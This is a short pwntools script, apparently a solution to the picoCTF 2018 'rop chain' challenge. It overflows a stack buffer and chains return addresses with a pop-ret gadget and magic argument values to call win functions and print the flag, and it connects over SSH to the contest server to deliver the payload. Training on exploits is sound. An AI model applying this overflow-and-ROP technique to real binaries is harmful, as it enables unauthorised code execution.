#!/usr/bin/python
from pwn import *

USER = 'Platy' # Change username accordingly.

padding = 'A' * 28

win1_addr = p32(0x80485cb)
win2_addr = p32(0x80485d8)
flag_addr = p32(0x804862b)

pop_ret_gadget = p32(0x08048806)

arg_check1 = p32(0xBAAAAAAD)
arg_check2 = p32(0xDEADBAAD)

exploit = padding + win1_addr + win2_addr + pop_ret_gadget + arg_check1 + flag_addr + pop_ret_gadget + arg_check2

s = ssh(host='2018shell1.picoctf.com', user=USER) # Make sure ssh-keyz challenge is done first
py = s.run('cd /problems/rop-chain_0_6cdbecac1c3aa2316425c7d44e6ddf9d; ./rop')
print py.recv()
py.sendline(exploit)
print py.recv()
